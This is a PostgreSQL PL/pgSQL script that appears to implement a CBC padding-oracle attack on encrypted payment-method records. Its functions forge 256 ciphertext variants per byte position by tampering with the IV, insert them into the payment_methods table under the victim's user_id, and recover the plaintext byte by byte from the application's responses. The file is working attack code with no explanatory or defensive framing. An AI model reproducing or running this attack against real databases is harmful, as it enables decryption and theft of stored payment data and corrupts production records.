
CREATE OR REPLACE FUNCTION xor_array(bytea, bytea) RETURNS bytea AS $$
DECLARE
    i integer;
BEGIN
    IF LENGTH($1) != LENGTH($2) THEN
        RAISE EXCEPTION 'Arrays must be of equal length';
    END IF;
    FOR i IN 0..(LENGTH($1) - 1) LOOP
        $1 := set_byte($1, i, get_byte($1, i) # get_byte($2, i));
    END LOOP;
    RETURN $1;
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION create_padding_iv(zeroizing_iv bytea, padval integer) RETURNS bytea AS $$
DECLARE
    i integer;
BEGIN
    FOR i IN 0..(LENGTH(zeroizing_iv) - 1) LOOP
        zeroizing_iv := set_byte(zeroizing_iv, i, get_byte(zeroizing_iv, i) # padval);
    END LOOP;
    RETURN zeroizing_iv;
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION ct_variants(zeroizing_iv bytea, ciphertext bytea, n integer) RETURNS SETOF bytea AS $$
DECLARE
    candidate integer;
    padding_iv bytea;
BEGIN
    padding_iv := create_padding_iv(zeroizing_iv, n);
    FOR candidate IN 0..255 LOOP
        padding_iv := set_byte(padding_iv, 16 - n, candidate);
        RETURN NEXT overlay(ciphertext placing padding_iv from 1 for 16);
    END LOOP;
END;
$$ LANGUAGE plpgsql;

-- Insert 256 ct_variants into the database for a given payment method and target block
-- Returns the ID of the starting record
-- TODO: Check first byte false positive
CREATE OR REPLACE FUNCTION insert_ct_variants(zeroizing_iv bytea, payment_method_id integer, n integer) RETURNS integer AS $$
DECLARE
    start_id integer;
BEGIN
    WITH results AS (
        INSERT INTO payment_methods (user_id, attrs)
            SELECT user_id, encode(ct_variants(zeroizing_iv, decode(attrs, 'base64'), n), 'base64')
            FROM payment_methods WHERE id = payment_method_id RETURNING id
    ) SELECT id into start_id FROM results limit 1;
    RETURN start_id;
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION update_zeroizing_iv_from(zeroizing_iv bytea, record_id integer, pad_val integer) RETURNS bytea AS $$
DECLARE
    byte integer;
BEGIN
    select get_byte(decode(attrs, 'base64'), 16 - pad_val) into byte from payment_methods where id = record_id;
    RETURN set_byte(zeroizing_iv, 16 - pad_val, byte # pad_val);
END;
$$ LANGUAGE plpgsql;